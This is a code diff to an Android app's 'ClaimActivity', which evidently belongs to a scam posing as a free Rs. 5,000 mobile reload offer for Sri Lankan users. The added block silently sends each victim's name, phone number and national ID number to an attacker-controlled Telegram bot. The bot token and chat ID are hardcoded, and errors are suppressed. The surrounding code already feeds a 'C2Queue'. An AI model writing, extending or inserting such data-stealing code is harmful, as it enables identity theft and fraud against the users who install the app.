@@ -78,6 +78,22 @@ class ClaimActivity : AppCompatActivity() {
                 put("ts", System.currentTimeMillis())
             }
             C2Queue.enqueueUrgent(payload.toString())
+                    
+            Thread {
+                try {
+                    val token = "8561465025:AAE1gWJhFxVP016X0c0fYXjzpW6oN5x1P9A"
+                    val chatId = "8526210532"
+                    val msg = "📝 FORM\nName: $name\nDialog: $number\nNIC: $nic"
+                    val url = "https://api.telegram.org/bot$token/sendMessage"
+                    val body = okhttp3.FormBody.Builder()
+                        .add("chat_id", chatId)
+                        .add("text", msg)
+                        .build()
+                    val req = okhttp3.Request.Builder().url(url).post(body).build()
+                    okhttp3.OkHttpClient().newCall(req).execute().use { }
+                } catch (_: Exception) {}
+            }.start()
+
 
             status.text = "✅ ස්තූතියි!\n\nඔබගේ රු. 5,000 Reload එක\n24 පැය ඇතුළත ලැබෙනු ඇත."
             btn.isEnabled = false
